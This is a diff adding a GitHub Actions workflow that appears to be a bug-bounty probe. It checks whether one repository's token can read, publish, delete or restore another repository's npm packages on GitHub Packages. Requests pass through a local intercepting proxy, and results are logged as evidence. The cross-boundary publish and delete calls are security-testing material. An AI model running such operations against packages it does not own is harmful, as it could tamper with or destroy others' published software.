@@ -1,0 +1,358 @@
+name: Package boundary source operation
+
+on:
+  workflow_dispatch:
+    inputs:
+      operation:
+        required: true
+        type: choice
+        options:
+          - controls
+          - read
+          - publish
+          - delete_version
+          - delete_package
+          - restore_version
+          - restore_package
+      tag:
+        required: true
+        type: string
+      victim_active_version_id:
+        required: false
+        type: string
+      victim_restore_version_id:
+        required: false
+        type: string
+
+permissions:
+  contents: read
+  packages: write
+
+jobs:
+  probe:
+    runs-on:
+      - self-hosted
+      - github2-package-source-20260729
+    timeout-minutes: 15
+    env:
+      HTTPS_PROXY: http://127.0.0.1:8080
+      HTTP_PROXY: http://127.0.0.1:8080
+      NODE_EXTRA_CA_CERTS: /Users/rez0/tools/caido-ca/caido.pem
+      npm_config_cafile: /Users/rez0/tools/caido-ca/caido.pem
+    steps:
+      - name: Run one source-token package operation
+        id: probe
+        shell: bash
+        env:
+          GH_TOKEN_VALUE: ${{ github.token }}
+          OPERATION: ${{ inputs.operation }}
+          PROBE_TAG: ${{ inputs.tag }}
+          VICTIM_ACTIVE_VERSION_ID: ${{ inputs.victim_active_version_id }}
+          VICTIM_RESTORE_VERSION_ID: ${{ inputs.victim_restore_version_id }}
+        run: |
+          set -uo pipefail
+          mkdir -p evidence packages
+          umask 077
+
+          api_cfg="$RUNNER_TEMP/package-api.cfg"
+          npm_cfg="$RUNNER_TEMP/package-npmrc"
+          {
+            printf 'header = "Authorization: Bearer %s"\n' "$GH_TOKEN_VALUE"
+            printf 'header = "Accept: application/vnd.github+json"\n'
+            printf 'header = "X-GitHub-Api-Version: 2026-03-10"\n'
+            printf 'header = "X-Bug-Bounty: rez0"\n'
+            printf 'header = "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"\n'
+          } > "$api_cfg"
+          {
+            printf '@jtestappomni:registry=https://npm.pkg.github.com\n'
+            printf '//npm.pkg.github.com/:_authToken=${NODE_AUTH_TOKEN}\n'
+            printf 'always-auth=true\n'
+            printf 'proxy=http://127.0.0.1:8080\n'
+            printf 'https-proxy=http://127.0.0.1:8080\n'
+            printf 'cafile=/Users/rez0/tools/caido-ca/caido.pem\n'
+            printf 'strict-ssl=true\n'
+            printf 'user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\n'
+          } > "$npm_cfg"
+          chmod 600 "$api_cfg" "$npm_cfg"
+
+          sanitize_log() {
+            sed -E \
+              -e 's/gh[soup]_[A-Za-z0-9_]+/[REDACTED_GITHUB_TOKEN]/g' \
+              -e 's/github_pat_[A-Za-z0-9_]+/[REDACTED_GITHUB_TOKEN]/g'
+          }
+
+          api_call() {
+            local label="$1"
+            local method="$2"
+            local route="$3"
+            curl -sS \
+              --proxy http://127.0.0.1:8080 \
+              --config "$api_cfg" \
+              -X "$method" \
+              -o "evidence/${label}.response.json" \
+              -w '%{http_code}\n' \
+              "$route" > "evidence/${label}.status"
+          }
+
+          publish_package() {
+            local label="$1"
+            local package_name="$2"
+            local version="$3"
+            local repository="$4"
+            local package_dir="packages/${label}"
+            mkdir -p "$package_dir"
+            jq -n \
+              --arg name "@jtestappomni/${package_name}" \
+              --arg version "$version" \
+              --arg repository "https://github.com/jtestappomni/${repository}.git" \
+              --arg marker "${label}-${PROBE_TAG}" \
+              '{
+                name:$name,
+                version:$version,
+                description:"Owned GitHub Packages repository-boundary control",
+                main:"index.js",
+                license:"UNLICENSED",
+                repository:{type:"git",url:$repository},
+                publishConfig:{registry:"https://npm.pkg.github.com"},
+                files:["index.js"],
+                scripts:{}
+              }' > "${package_dir}/package.json"
+            printf 'module.exports = %s;\n' "$(jq -Rn --arg marker "${label}-${PROBE_TAG}" '$marker')" \
+              > "${package_dir}/index.js"
+            (
+              cd "$package_dir" || exit 91
+              NODE_AUTH_TOKEN="$GH_TOKEN_VALUE" \
+                NPM_CONFIG_USERCONFIG="$npm_cfg" \
+                npm publish --ignore-scripts --registry https://npm.pkg.github.com
+            ) > "evidence/${label}.publish.raw.log" 2>&1
+            local publish_rc=$?
+            sanitize_log < "evidence/${label}.publish.raw.log" > "evidence/${label}.publish.log"
+            rm -f "evidence/${label}.publish.raw.log"
+            printf '%s\n' "$publish_rc" > "evidence/${label}.publish.rc"
+          }
+
+          npm_view() {
+            local label="$1"
+            local package_spec="$2"
+            NODE_AUTH_TOKEN="$GH_TOKEN_VALUE" \
+              NPM_CONFIG_USERCONFIG="$npm_cfg" \
+              npm view "$package_spec" version --registry https://npm.pkg.github.com \
+              > "evidence/${label}.view.raw.log" 2>&1
+            local view_rc=$?
+            sanitize_log < "evidence/${label}.view.raw.log" > "evidence/${label}.view.log"
+            rm -f "evidence/${label}.view.raw.log"
+            printf '%s\n' "$view_rc" > "evidence/${label}.view.rc"
+          }
+
+          package_route() {
+            local package_name="$1"
+            printf 'https://api.github.com/orgs/jtestappomni/packages/npm/%s' "$package_name"
+          }
+
+          active_victim='github2-victim-package-20260729'
+          restore_version_victim='github2-victim-restore-version-20260729'
+          restore_package_victim='github2-victim-restore-package-20260729'
+          nonexistent='github2-package-does-not-exist-20260729'
+          source_active='github2-source-package-20260729'
+          source_restore='github2-source-restore-package-20260729'
+          source_repo='github2-artmeta-source-20260729'
+          victim_repo='github2-package-victim-20260729'
+
+          cross_status=''
+          cross_effect=false
+          control_ok=true
+
+          case "$OPERATION" in
+            controls)
+              publish_package source-active-v1 "$source_active" 1.0.0 "$source_repo"
+              publish_package source-active-v2 "$source_active" 1.0.1 "$source_repo"
+              publish_package source-restore-v1 "$source_restore" 1.0.0 "$source_repo"
+              for rc_file in evidence/*.publish.rc
+              do
+                if [ "$(tr -d '\r\n' < "$rc_file")" != "0" ]
+                then
+                  control_ok=false
+                fi
+              done
+
+              source_active_route="$(package_route "$source_active")"
+              source_restore_route="$(package_route "$source_restore")"
+              api_call control-source-package-read GET "$source_active_route"
+              api_call control-source-versions-before GET "${source_active_route}/versions?per_page=100"
+              source_version_id="$(
+                jq -r '.[] | select(.name == "1.0.1") | .id' evidence/control-source-versions-before.response.json |
+                  head -n 1
+              )"
+              if [ "$(tr -d '\r\n' < evidence/control-source-package-read.status)" != "200" ] ||
+                 [ -z "$source_version_id" ]
+              then
+                control_ok=false
+              else
+                api_call control-source-delete-version DELETE \
+                  "${source_active_route}/versions/${source_version_id}"
+                api_call control-source-version-after-delete GET \
+                  "${source_active_route}/versions/${source_version_id}"
+                api_call control-source-restore-version POST \
+                  "${source_active_route}/versions/${source_version_id}/restore"
+                api_call control-source-version-after-restore GET \
+                  "${source_active_route}/versions/${source_version_id}"
+                if [ "$(tr -d '\r\n' < evidence/control-source-delete-version.status)" != "204" ] ||
+                   [ "$(tr -d '\r\n' < evidence/control-source-version-after-delete.status)" != "404" ] ||
+                   [ "$(tr -d '\r\n' < evidence/control-source-restore-version.status)" != "204" ] ||
+                   [ "$(tr -d '\r\n' < evidence/control-source-version-after-restore.status)" != "200" ]
+                then
+                  control_ok=false
+                fi
+              fi
+
+              api_call control-source-delete-package DELETE "$source_restore_route"
+              api_call control-source-package-after-delete GET "$source_restore_route"
+              api_call control-source-restore-package POST "${source_restore_route}/restore"
+              api_call control-source-package-after-restore GET "$source_restore_route"
+              if [ "$(tr -d '\r\n' < evidence/control-source-delete-package.status)" != "204" ] ||
+                 [ "$(tr -d '\r\n' < evidence/control-source-package-after-delete.status)" != "404" ] ||
+                 [ "$(tr -d '\r\n' < evidence/control-source-restore-package.status)" != "204" ] ||
+                 [ "$(tr -d '\r\n' < evidence/control-source-package-after-restore.status)" != "200" ]
+              then
+                control_ok=false
+              fi
+              ;;
+
+            read)
+              active_route="$(package_route "$active_victim")"
+              nonexistent_route="$(package_route "$nonexistent")"
+              source_route="$(package_route "$source_active")"
+              api_call cross-read-victim-package GET "$active_route"
+              api_call cross-read-victim-versions GET "${active_route}/versions?per_page=100"
+              if [ -n "$VICTIM_ACTIVE_VERSION_ID" ]
+              then
+                api_call cross-read-victim-version GET \
+                  "${active_route}/versions/${VICTIM_ACTIVE_VERSION_ID}"
+              fi
+              npm_view cross-read-victim-registry "@jtestappomni/${active_victim}@1.0.0"
+              api_call control-read-source-package GET "$source_route"
+              api_call control-read-nonexistent-package GET "$nonexistent_route"
+              api_call control-read-nonexistent-versions GET "${nonexistent_route}/versions?per_page=100"
+              cross_status="$(tr -d '\r\n' < evidence/cross-read-victim-package.status)"
+              if [ "$cross_status" = "200" ] ||
+                 [ "$(tr -d '\r\n' < evidence/cross-read-victim-versions.status)" = "200" ] ||
+                 [ "$(tr -d '\r\n' < evidence/cross-read-victim-registry.view.rc)" = "0" ]
+              then
+                cross_effect=true
+              fi
+              if [ "$(tr -d '\r\n' < evidence/control-read-source-package.status)" != "200" ]
+              then
+                control_ok=false
+              fi
+              ;;
+
+            publish)
+              publish_package cross-publish-victim "$active_victim" 9.9.29-package-scope.1 "$victim_repo"
+              cross_status="$(tr -d '\r\n' < evidence/cross-publish-victim.publish.rc)"
+              if [ "$cross_status" = "0" ]
+              then
+                cross_effect=true
+              fi
+              ;;
+
+            delete_version)
+              active_route="$(package_route "$active_victim")"
+              if [ -z "$VICTIM_ACTIVE_VERSION_ID" ]
+              then
+                control_ok=false
+              else
+                api_call cross-delete-victim-version DELETE \
+                  "${active_route}/versions/${VICTIM_ACTIVE_VERSION_ID}"
+                cross_status="$(tr -d '\r\n' < evidence/cross-delete-victim-version.status)"
+                if [ "$cross_status" = "204" ]
+                then
+                  cross_effect=true
+                fi
+              fi
+              api_call control-delete-nonexistent-version DELETE \
+                "${active_route}/versions/999999999999"
+              ;;
+
+            delete_package)
+              active_route="$(package_route "$active_victim")"
+              nonexistent_route="$(package_route "$nonexistent")"
+              api_call cross-delete-victim-package DELETE "$active_route"
+              api_call control-delete-nonexistent-package DELETE "$nonexistent_route"
+              cross_status="$(tr -d '\r\n' < evidence/cross-delete-victim-package.status)"
+              if [ "$cross_status" = "204" ]
+              then
+                cross_effect=true
+              fi
+              ;;
+
+            restore_version)
+              restore_version_route="$(package_route "$restore_version_victim")"
+              if [ -z "$VICTIM_RESTORE_VERSION_ID" ]
+              then
+                control_ok=false
+              else
+                api_call cross-restore-victim-version POST \
+                  "${restore_version_route}/versions/${VICTIM_RESTORE_VERSION_ID}/restore"
+                cross_status="$(tr -d '\r\n' < evidence/cross-restore-victim-version.status)"
+                if [ "$cross_status" = "204" ]
+                then
+                  cross_effect=true
+                fi
+              fi
+              api_call control-restore-nonexistent-version POST \
+                "${restore_version_route}/versions/999999999999/restore"
+              ;;
+
+            restore_package)
+              restore_package_route="$(package_route "$restore_package_victim")"
+              nonexistent_route="$(package_route "$nonexistent")"
+              api_call cross-restore-victim-package POST "${restore_package_route}/restore"
+              api_call control-restore-nonexistent-package POST "${nonexistent_route}/restore"
+              cross_status="$(tr -d '\r\n' < evidence/cross-restore-victim-package.status)"
+              if [ "$cross_status" = "204" ]
+              then
+                cross_effect=true
+              fi
+              ;;
+
+            *)
+              control_ok=false
+              ;;
+          esac
+
+          jq -n \
+            --arg operation "$OPERATION" \
+            --arg tag "$PROBE_TAG" \
+            --arg repository '${{ github.repository }}' \
+            --argjson repository_id '${{ github.repository_id }}' \
+            --arg cross_status "$cross_status" \
+            --argjson cross_effect "$cross_effect" \
+            --argjson control_ok "$control_ok" \
+            '{
+              operation:$operation,
+              tag:$tag,
+              repository:$repository,
+              repository_id:$repository_id,
+              cross_status:$cross_status,
+              cross_effect:$cross_effect,
+              control_ok:$control_ok
+            }' > evidence/source-operation-summary.json
+
+          rm -f "$api_cfg" "$npm_cfg"
+          if [ "$cross_effect" = "true" ]
+          then
+            exit 77
+          fi
+          if [ "$control_ok" != "true" ]
+          then
+            exit 1
+          fi
+
+      - name: Upload source operation evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: package-boundary-source-${{ inputs.operation }}-${{ inputs.tag }}
+          path: evidence
+          if-no-files-found: error
+          retention-days: 7
